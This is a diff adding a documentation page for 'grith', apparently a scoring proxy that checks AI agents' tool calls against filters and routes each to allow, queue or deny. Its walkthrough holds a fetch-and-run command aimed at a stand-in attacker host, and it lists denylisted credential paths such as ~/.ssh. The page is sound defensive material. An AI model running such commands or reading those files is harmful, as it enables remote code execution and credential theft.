@@ -1,0 +1,179 @@
+---
+title: "Scoring Proxy"
+description: "SpamAssassin-inspired multi-filter scoring, four-phase pipeline, thresholds, and adaptive learning"
+section: "concepts"
+order: 3
+tier: "community"
+lastUpdated: "2026-02-24"
+---
+
+The scoring proxy is the core of grith's security model. Inspired by SpamAssassin's approach to email classification, it evaluates every tool call against 17+ independent filters, aggregates weighted scores, and routes the call to one of three decision zones: ALLOW, QUEUE, or DENY.
+
+## Decision zones
+
+Every tool call receives a composite score. That score determines what happens next:
+
+| Zone | Score range | Action | Typical frequency |
+|---|---|---|---|
+| ALLOW | < 3.0 | Auto-execute immediately, full audit log | 80–90% of calls |
+| QUEUE | 3.0–8.0 | Quarantine for human review in the digest | 5–15% of calls |
+| DENY | > 8.0 | Block immediately, log the attempt | 1–5% of calls |
+
+<Callout type="info" title="Cold-start behaviour">
+During the first 200 tool calls after a fresh installation, grith widens the QUEUE zone to 2.0–10.0. This conservative posture catches more edge cases while you and grith are still calibrating. After 200 calls, thresholds return to the standard 3.0–8.0 range.
+</Callout>
+
+The thresholds are configurable in `config.toml`:
+
+<ConfigExample title="Score threshold configuration" code={`[scoring]
+allow_threshold = 3.0
+deny_threshold = 8.0
+cold_start_calls = 200
+cold_start_allow = 2.0
+cold_start_deny = 10.0
+`} />
+
+## Filter pipeline
+
+Filters execute in four phases. Within each phase, filters run in parallel for performance. Between phases, scores accumulate.
+
+### Phase 1: Static filters
+
+Static filters use precomputed data structures and run in under 0.1ms each. They handle the fastest, most deterministic checks.
+
+| Filter | What it checks | Typical score contribution |
+|---|---|---|
+| **Path allowlist** | Is the target path explicitly permitted by the active profile? | -1.0 to 0.0 |
+| **Path denylist** | Does the path match a denied pattern (`~/.ssh/**`, `~/.aws/**`)? | +3.0 to +10.0 |
+| **Argument validator** | Are command arguments well-formed and within expected bounds? | 0.0 to +2.0 |
+| **Aho-Corasick blocklist** | Does the call content match known dangerous patterns (multi-pattern string matching)? | +2.0 to +8.0 |
+
+<Callout type="tip" title="Aho-Corasick performance">
+The blocklist filter uses the Aho-Corasick algorithm, which matches thousands of patterns in a single pass through the input. This makes blocklist checking effectively O(n) in the length of the input, regardless of how many patterns are defined.
+</Callout>
+
+### Phase 2: Pattern filters
+
+Pattern filters perform deeper content analysis, typically completing in 0.5–3ms.
+
+| Filter | What it checks | Typical score contribution |
+|---|---|---|
+| **Secret scanner** | Does the call contain API keys, tokens, passwords, or private keys? | +4.0 to +10.0 |
+| **Command analyser** | Does the shell command use dangerous patterns (pipes to curl, encoded payloads, privilege escalation)? | +2.0 to +8.0 |
+| **Egress inspector** | Is the network destination expected? Does it match known exfiltration targets or cloud metadata endpoints? | +3.0 to +10.0 |
+| **File type analyser** | Is the file type consistent with the operation? (e.g., writing to a `.sh` file when the task is "edit CSS") | +1.0 to +4.0 |
+
+### Phase 3: Context filters
+
+Context filters incorporate session history and behavioural signals, typically completing in 0.1–3ms.
+
+| Filter | What it checks | Typical score contribution |
+|---|---|---|
+| **Behavioural baseline** | Does this call deviate from the tool's established patterns? | +1.0 to +5.0 |
+| **Taint tracker** | Has data from a sensitive source flowed into this call's arguments? | +2.0 to +6.0 |
+| **Rate limiter** | Is the tool making calls at an unusual rate? | +1.0 to +4.0 |
+| **Session coherence** | Does this call make sense given the task context? | +0.5 to +3.0 |
+| **Escalation detector** | Is the tool progressively expanding its access scope? | +2.0 to +6.0 |
+
+### Phase 4: Aggregation
+
+The aggregation phase combines individual filter scores into a final composite score. Each filter's output is multiplied by a configurable weight, and the results are summed:
+
+```
+final_score = sum(filter_score[i] * weight[i]) for all filters
+```
+
+The final score is compared against the ALLOW and DENY thresholds to produce a decision.
+
+## Early termination
+
+If the accumulated score exceeds the auto-deny threshold at any point during the pipeline, grith skips the remaining phases and blocks the call immediately. This prevents wasting computation on calls that are already clearly dangerous.
+
+For example, if a tool call tries to read `~/.ssh/id_rsa` and the path denylist assigns +10.0 in Phase 1, grith does not proceed to secret scanning, behavioural analysis, or any other filter. The call is denied at the end of Phase 1.
+
+## Scoring walkthrough
+
+Consider a tool call: `write_file(path="/home/user/project/src/utils.ts", content="export function formatDate...")`.
+
+```
+Phase 1: Static filters (parallel, <0.1ms each)
+  Path allowlist:    -0.5  (path is in the project workspace)
+  Path denylist:      0.0  (no denied pattern matches)
+  Argument validator: 0.0  (well-formed arguments)
+  Aho-Corasick:       0.0  (no blocked patterns in content)
+
+Phase 2: Pattern filters (parallel, 0.5-3ms each)
+  Secret scanner:     0.0  (no secrets detected)
+  Command analyser:   0.0  (not a command execution)
+  Egress inspector:   0.0  (no network activity)
+  File type analyser: 0.0  (TypeScript file, consistent with task)
+
+Phase 3: Context filters (parallel, 0.1-3ms each)
+  Behavioural:        0.0  (consistent with session patterns)
+  Taint tracker:      0.0  (no tainted data in arguments)
+  Rate limiter:       0.0  (normal call rate)
+  Session coherence:  0.0  (file edit matches task context)
+  Escalation:         0.0  (no scope expansion)
+
+Phase 4: Aggregation
+  Final score: -0.5
+  Decision: ALLOW
+```
+
+Total pipeline latency: under 5ms. The call executes without any human intervention.
+
+Now consider: `exec_command(command="curl -s https://evil.example.com/exfil | sh")`.
+
+```
+Phase 1: Static filters
+  Path allowlist:    0.0
+  Path denylist:     0.0
+  Argument validator: +1.0  (piped command)
+  Aho-Corasick:      +4.0  (matches "curl ... | sh" pattern)
+
+  Accumulated score: 5.0
+
+Phase 2: Pattern filters
+  Command analyser:  +5.0  (pipe to shell, external URL)
+  Egress inspector:  +4.0  (unknown external destination)
+
+  Accumulated score: 14.0 — exceeds auto-deny threshold
+
+  → Early termination. Phase 3 skipped.
+
+Phase 4: Aggregation
+  Final score: 14.0
+  Decision: DENY
+```
+
+The call is blocked. The full filter trace is written to the audit log.
+
+## Adaptive learning
+
+When a human reviews a queued call in the [quarantine digest](/docs/concepts/quarantine-digest), their decision feeds back into the scoring system. If a developer consistently approves calls that a particular filter flagged, grith gradually reduces that filter's weight for similar patterns. If a developer consistently denies calls that scored near the ALLOW threshold, grith increases the relevant weights.
+
+This happens through small, bounded weight adjustments — no filter's weight can be reduced to zero or increased beyond a configurable maximum. The system converges over time toward your team's actual risk tolerance.
+
+<Callout type="warning" title="Adaptive learning has guardrails">
+Weight adjustments are bounded and gradual. A filter's weight cannot drop below a configured floor or rise above a configured ceiling. Critical security filters (secret scanning, path denylist) have higher floors to prevent accidental disabling through feedback.
+</Callout>
+
+## Performance budget
+
+The entire scoring pipeline is designed to complete in under 10ms for typical calls:
+
+| Phase | Target latency | Parallelism |
+|---|---|---|
+| Static filters | < 0.1ms each | Fully parallel |
+| Pattern filters | 0.5–3ms each | Fully parallel |
+| Context filters | 0.1–3ms each | Fully parallel |
+| Aggregation | < 0.1ms | Sequential (single sum) |
+| **Total typical** | **< 5ms** | |
+
+For the built-in agent, this latency is imperceptible — it is orders of magnitude faster than the LLM inference that generated the tool call. For the CLI supervisor, it adds negligible overhead to syscall execution.
+
+## Next steps
+
+- [Quarantine Digest](/docs/concepts/quarantine-digest) — How QUEUE decisions reach the developer
+- [Zero-Trust Model](/docs/concepts/zero-trust-model) — The principles behind the scoring design
+- [Filter Reference](/docs/reference/filters) — Full specification of every filter
